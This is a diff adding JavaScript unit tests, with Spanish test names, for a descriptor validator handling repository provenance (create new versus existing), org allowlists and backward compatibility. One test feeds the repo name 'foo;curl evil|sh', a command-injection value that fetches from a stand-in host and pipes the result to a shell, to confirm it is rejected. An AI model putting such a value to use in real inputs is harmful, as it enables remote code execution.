@@ -459,3 +459,59 @@ test('CA-7/CA-3: deriveProviderBudget devuelve copia y valida Σ ≤ 100% impera
   assert.deepEqual(budget, { anthropic: 60, codex: 40 });
   assert.throws(() => d.deriveProviderBudget({ thresholds: { providerBudget: { a: 60, b: 60 } } }), /100%/);
 });
+
+// -----------------------------------------------------------------------------
+// #4800 — Provenance de repositorios (crear repo nuevo vs usar existente)
+// -----------------------------------------------------------------------------
+
+test('#4800: descriptor provenance:create (sin url) valida', () => {
+  const desc = validDescriptor({
+    repositories: [{ id: 'main', role: 'primary', defaultBaseRef: 'main', provenance: 'create', create: { name: 'store', org: 'intrale', visibility: 'private' } }],
+  });
+  const res = d.validateDescriptor(desc);
+  assert.equal(res.valid, true, JSON.stringify(res.errors));
+});
+
+test('#4800: provenance:create con url explícita es rechazado (la completa el kernel)', () => {
+  const desc = validDescriptor({
+    repositories: [{ id: 'main', role: 'primary', provenance: 'create', url: 'https://github.com/intrale/store', create: { name: 'store', org: 'intrale' } }],
+  });
+  const res = d.validateDescriptor(desc);
+  assert.equal(res.valid, false);
+});
+
+test('#4800: provenance:create con org fuera de la allowlist es rechazado (A01)', () => {
+  const desc = validDescriptor({
+    repositories: [{ id: 'main', role: 'primary', provenance: 'create', create: { name: 'store', org: 'evil-corp' } }],
+  });
+  const res = d.validateDescriptor(desc);
+  assert.equal(res.valid, false);
+  assert.equal(res.stage, 'provenance');
+});
+
+test('#4800: provenance:create con nombre inválido es rechazado (A03 fail-closed)', () => {
+  const desc = validDescriptor({
+    repositories: [{ id: 'main', role: 'primary', provenance: 'create', create: { name: 'foo;curl evil|sh', org: 'intrale' } }],
+  });
+  const res = d.validateDescriptor(desc);
+  assert.equal(res.valid, false);
+});
+
+test('#4800: provenance:existing sin url es rechazado', () => {
+  const desc = validDescriptor({
+    repositories: [{ id: 'main', role: 'primary', provenance: 'existing' }],
+  });
+  const res = d.validateDescriptor(desc);
+  assert.equal(res.valid, false);
+});
+
+test('#4800: retro-compat — descriptor legacy sin provenance sigue válido como existing', () => {
+  // validDescriptor() usa {id, url, role} sin provenance → debe seguir validando.
+  const res = d.validateDescriptor(validDescriptor());
+  assert.equal(res.valid, true);
+});
+
+test('#4800: repoProvenance default es existing cuando el campo está ausente', () => {
+  assert.equal(d.repoProvenance({ id: 'main', url: 'https://github.com/x/y' }), 'existing');
+  assert.equal(d.repoProvenance({ id: 'main', provenance: 'create', create: { name: 'y', org: 'intrale' } }), 'create');
+});
